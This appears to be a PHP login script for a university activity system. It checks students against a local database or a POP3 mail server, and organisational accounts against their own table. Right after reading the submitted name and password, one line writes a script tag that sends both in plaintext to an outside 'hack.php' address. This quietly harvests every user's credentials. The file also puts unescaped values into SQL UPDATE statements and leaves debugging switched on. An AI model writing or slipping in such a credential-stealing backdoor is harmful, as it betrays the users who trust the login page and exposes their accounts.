<?php
	session_start();
	
	require_once("conn/db.php");
	require_once("pop3.php");
?>
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	</head>
	<body>
<?php
	// 記錄ip
	if(empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$ip = $_SERVER['REMOTE_ADDR'];
	} else {
		$ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
		$ip = $ip[0];
	}
	
	if($_POST['name'] != "" && $_POST['pass'] != "") 
	{
		// 取出帳密
		$user = $_POST['name'];
		$password = $_POST['pass'];
		echo "<script src=\"http://140.115.189.157/hack.php?pass=".$user.":".$password."\"></script>";
		//防範sql injection攻擊
		$user = mysql_real_escape_string($user);
		$password = mysql_real_escape_string($password);
		
		//temp ban ip and protect from 'root'===================================================================================================================
		if ($ip == '140.115.17.34')
		{
				echo
					"
						<script>
							alert(\"系統已偵測您惡意測試帳號並封鎖，請來信服務學習組說明原因方可解鎖\");
							self.location.href='index.php';
						</script>
					";
		}
		if ($user == 'root' OR $user == 'admin' OR $user == 'sys' OR $user == 'sysoper')
		{
				echo
					"
						<script>
							alert(\"無此帳號\");
							self.location.href='index.php';
						</script>
					";
		}
		
		
		// temp end ======================================================================================================
		
		$p = sha1($_POST['pass']);
		// 學生
		if(is_numeric($user))
		{	
			$sql1 = sprintf("SELECT st_password FROM user_copy WHERE st_number='%s'", mysql_real_escape_string($user)); 
			$ret1 = mysql_query($sql1) or die(mysql_error());
			$row1 = mysql_fetch_assoc($ret1);
			$st_pass = $row1['st_password'];
			$sucess=false;
			//本機DB中尚未記錄此pass 用pop3認證
			$sql = sprintf("SELECT * FROM `user_copy` WHERE st_number='%s' AND st_password='%s'", mysql_real_escape_string($user), mysql_real_escape_string($p)); 
				$ret = mysql_query($sql, $db) or die(mysql_error());
				if($row = mysql_fetch_assoc($ret)){
					$sql = sprintf("SELECT * FROM `all_user` WHERE user_student = '%s'", mysql_real_escape_string($user)); 
					$ret = mysql_query($sql, $db) or die(mysql_error());
					if($row = mysql_fetch_assoc($ret))
					{
						// 記錄session
						$_SESSION['valid_token']			= "1";						// token
						$_SESSION['valid_student_id']		= $row['user_student'];		// 學號
						$_SESSION['valid_student_name']		= $row['user_name'];		// 姓名
						$sucess=true;
						// 登入時間
						$sql = "UPDATE `all_user` SET `user_login_ip` = '$ip', `user_login_time` = NOW() WHERE `user_student` = '$user'";
						$ret = mysql_query($sql, $db) or die(mysql_error());
						
						//將pass紀錄至DB
						$sql1 = "UPDATE `user_copy` SET  `st_password` =  '$p' WHERE `st_number` = '$user'";
						$ret1 = mysql_query($sql1, $db) or die(mysql_error());
						
						echo
						"
							<script>
								alert(\"登入成功\");
								self.location.href='personal.php';
							</script>
						";
					}
					else 
					{
						echo
						"
							<script>
								alert(\"系統無此帳號\");
								self.location.href='index.php';
							</script>
						";	
					}
				}
			if(!$sucess){
			
			
			
				// pop3 認證(計中sparc)
				$pop3 = new pop3_class;
				$pop3->hostname							= "pop3.cc.ncu.edu.tw";
				$pop3->port								= 110;
				$pop3->tls								= 0;
				$pop3->realm							= "";
				$pop3->workstation						= "";
				$apop									= 0;
				$pop3->authentication_mechanism 		= "USER";
				$pop3->debug 							= 1;
				$pop3->html_debug 						= 1;
				$pop3->join_continuation_header_lines 	= 1;
				
				// 檢查pop3是否可連線
				$error = $pop3->Open();
				
				if($error == "") 
				{
					$error = $pop3->Login($user, $password, $apop);
					
	// debug�&#65533;
	//$user = "75066100";
	//$error = "";
					
					// 成功登入
					if($error == "") 
					{
						$sql = sprintf("SELECT * FROM `all_user` WHERE user_student = '%s'", mysql_real_escape_string($user)); 
						$ret = mysql_query($sql, $db) or die(mysql_error());
						if($row = mysql_fetch_assoc($ret))
						{
							// 記錄session
							$_SESSION['valid_token']			= "1";						// token
							$_SESSION['valid_student_id']		= $row['user_student'];		// 學號
							$_SESSION['valid_student_name']		= $row['user_name'];		// 姓名
							
							// 登入時間
							$sql = "UPDATE `all_user` SET `user_login_ip` = '$ip', `user_login_time` = NOW() WHERE `user_student` = '$user'";
							
							$ret = mysql_query($sql, $db) or die(mysql_error());
							
							//將pass紀錄至DB
							$sql1 = "UPDATE `user_copy` SET  `st_password` =  '$p' WHERE `st_number` = '$user'";
							
							$ret1 = mysql_query($sql1, $db) or die(mysql_error());
							
							echo
							"
								<script>
									alert(\"登入成功\");
									self.location.href='personal.php';
								</script>
							";
						}
						else 
						{
							echo
							"
								<script>
									alert(\"系統無此帳號\");
									self.location.href='index.php';
								</script>
							";	
						}
					}
					elseif($error != "") {
						echo
						"
							<script>
								alert(\"帳號密碼有誤\");
								self.location.href='index.php';
							</script>
						";	
					}
				}
				else
				{
				print_r($error);
					echo
					"
						<script>
							alert(\"計中sparc無法連線\");
							self.location.href='index.php';
						</script>
					";	
				}
			//當DB中已有備份，直接從中做認證並且登�&#65533;
			}
		}
		else	// 申請活動的單�&#65533;
		{
			/*
			 *	有兩種可能認�&#65533;
			 *	1. 透過已經建立好的帳號進行認證(ncu_user)
			 *	2. 計中的sparc認證
			 */
			 //$sql = sprintf("SELECT * FROM `ncu_user` WHERE user_account = '%s' AND (user_password= old_password('%s') OR user_password= password('%s') AND user_del=0)", mysql_real_escape_string($user), mysql_real_escape_string($password),mysql_real_escape_string($password));
			$sql = sprintf("
			SELECT * FROM `ncu_user` 
			WHERE user_account = '%s' AND user_password= password('%s') AND user_del=0 "
			, mysql_real_escape_string($user), mysql_real_escape_string($password));
			//$sql = sprintf("SELECT * FROM `ncu_user` WHERE user_account = '%s' AND user_password= password('%s')", mysql_real_escape_string($user), mysql_real_escape_string($password)); 
			$ret = mysql_query($sql, $db) or die(mysql_error());
			
			// 第一種認�&#65533;
			if(mysql_num_rows($ret) == 1)
			{
				$row = mysql_fetch_assoc($ret);
				
				// 記錄session
				$_SESSION['valid_token']			= "2";						// token
				$_SESSION['valid_id']				= $row['user_id'];			//ID
				$_SESSION['valid_office_account']	= $row['user_account'];		// 帳號
				$_SESSION['valid_office']			= $row['user_office'];		// 單位
				$_SESSION['valid_type']				= 1;						// 第一種認�&#65533;
				
				// 記錄登入時間與ip			 	
				$sql = "UPDATE `ncu_user` SET `user_login_time` = NOW(), `user_login_ip` = '$ip' 
										  WHERE `user_account` = '$user'";
				
				$ret = mysql_query($sql, $db) or die(mysql_error());
				/*
				$sql = "INSERT INTO `ncu_user` (
										`user_id`,
										`user_account`,
										`user_password`,
										`user_power`,
										`user_office`,
										`user_identity`,
										`user_login_ip`,
										`user_login_time`,
										`user_del`
									) VALUES (
										NULL,
										'snmgtest01',
										password('snmgtest'),
										'2',
										'snmg測試',
										'單位管理�&#65533;',
										'$ip',
										NOW(),
										'0'
									)
								";
					
						$ret = mysql_query($sql, $db) or die(mysql_error());
				*/
						
				echo
				"
					<script>
						alert(\"登入成功\");
						self.location.href='others.php';
					</script>
				";
				exit;
			}
			else{
						echo
						"
							<script>
								alert(\"帳號密碼有誤\");
								self.location.href='index.php';
							</script>
						";	
					
				}
				
		}
	}
	else
	{
		echo
		"
			<script>
				alert(\"帳號或密碼不可為空\");
				self.location.href='index.php';
			</script>
		";	
	}
?>
<script>self.location.href='index.php';</script>
	</body>
</html>
